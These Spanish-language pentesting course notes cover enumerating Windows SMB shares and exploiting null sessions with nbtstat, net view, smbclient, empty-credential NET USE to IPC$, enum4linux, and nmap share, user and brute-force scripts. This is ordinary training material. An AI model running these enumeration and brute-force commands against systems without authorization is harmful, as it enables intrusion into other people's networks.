Enumerar las comparticiones es el primer paso a ejecutar para explotar una máquina Windows vulnerable a las null sessions.

### [](#header-3)NbtStat (Windows)
En Windows el comando más común a usar cuando estás enumerando comparticiones de Windows es nbtStat. Es una herramienta de líneas de comandos que muestra información de un objetivo

Podemos comprobar su uso mediante el parámetro /?
```
nbtstat /?
```
El uso más común de nbtstat es 
```
nbtstat -A <IP>
```

La primera línea de la tabla nos dice el nombre de la máquina corriendo en la IP. El tipo UNIQUE nos indica que este ordenador solo tiene una dirección IP asignada.

La segunda línea contiene el grupo de trabajo o el dominio en el que se encuentra el ordenador.

La tercera línea nos indica que el tipo de registro 20 nos indica que el servicio de compartición de archivos está corriendo en la máquina. Esto significa que podemos tratar de obtener más información sobre él.

### [](#header-3)NET VIEW (WINDOWS)
Una vez el atacante conoce que la máquina tiene el servidor de archivos corriendo puede enumerar todas las comparticiones usando el comando NET VIEW.

Si lo ejecutamos en la máquina anterior podemos ver que está compartiendo un directorio. El nombre de la compartición es eLs.
Hay otro directorio en la compartición: WIA_RIS_SHARE.


## [](#header-2)11.2 Utilidades de enumeración en Linux
### [](#header-3)Nmblookup

Para ejecutar la enumeración de comparticiones desde Linux debemos usar las herramientas de Samba.

Mediante el comando nmblookup podemos ejecutar las mismas operaciones que con nbtstat.
```
nmblookup -A <IP>
```
También podemos ver todo el manual mediante:
```
nmblookup --help
```
### [](#header-3)Smbclient

También tenemos la herramienta smbclient, es un cliente parecido a FTP para acceder a las comparticiones de Windows. Esta herramienta puede entre otras cosas enumerar las comparticiones que ofrece el host.
```
smbclient -L //10.130.40.80 -N
```
  - -L permite mirar que servicios están disponibles en un objetivo.
  - -N fuerza a la herramienta a que no pregunte por contraseña

Esta utilidad no sólo muestra las mismas comparticiones detectadas por Net View, también vemos algunas herramientas adminsitrativas como IPC$, ADMIN$ y C$.

## [](#header-2)11.3 Checking for Null Sessions

Una vez hemos detectado que el servicio de compartición de archivos e impresoras está activo y hemos enumerado las comparticiones de un objetivo es el momento de comprobar si un ataque de sesión nula es posible.

Para verificar esto podemos intentar explotar la compartición IPC$ sin ningún tipo de credenciales. 

### [](#header-3)En Windows:
Podemos usar el siguiente comando:
```
NET USE \\$RHOST\IPC$ ‘’ /u:’’
```
Esto le dice a Windows que se conecte a IPC usando una contraseña y un usuario vacíos.

Una vez comprobamos el acceso a la compartición debemos  probar a hacerlo en las demás comparticiones.

### [](#header-3)En Linux:
```
smbclient //$RHOST/IPC$ -N
```

## [](#header-2)11.4 Exploting Null Sessions
Explotar las Null Sessions puede ser realizado usando el comando NET de Windows, pero hay algunas herramientas que pueden automatizar esta tarea.

### [](#header-3)ENUM

Una de ellas es Enum, una utilidad de línea de comandos que recoge información de un sistema vulnerable a ataques de null session.

El parámetro -S enumera las comparticiones de una máquina.

El parámetro -U enumera los usuarios.

Si necesitas montar un ataque de autenticación de red puedes probar a comprobar la política de contraseñas con el parámetro -P.

### [](#header-3)WINFO
Es otra utilidad de línea de comandos que puede automatizar la explotación de las null session. Para usarlo solo tienes que especificar la IP mediante el parámetro -n, para decirle a la herramienta que utilice null sessions.

### [](#header-3)ENUM4LINUX
Puedes explotar las null sessions usando enum4linux, un script en Perl que performa las mismas operaciones que enum y winfo. Tiene todos los parámetros que la utilidad ENUM además de otras características.

  - Por defecto esta herramienta realiza:
  - Enumeración de usuarios.
  - Enumeración de comparticiones.
  - Enumeración de grupos y mieimbros.
  - Extracción de políticas de contraseña.
  - Detección de información de sistema operativo.
  - Ejecuta el nmblookup
  - Extracción de la información de impresoras.


Puedes comprobar las opciones del script llamándolo con el comando:
```
enum4linux
```

## [](#header-2)11.5 Otras utilidades
Podemos utilizar otras utilidades tales como: 
```
samrdump.py
```
Mediante nmap podemos listar las comparticiones  mediante:
```
nmap -script=smb-enum-shares $RHOST
```
Y los usuarios mediante:
```
nmap -script=smb-enum-users $RHOST
```
También podemos ejectuar un pequeño ataque de fuerza bruta mediante:
```
nmap -scrip=smb-brute $RHOST
```


Falta documentación. Web en actualización.
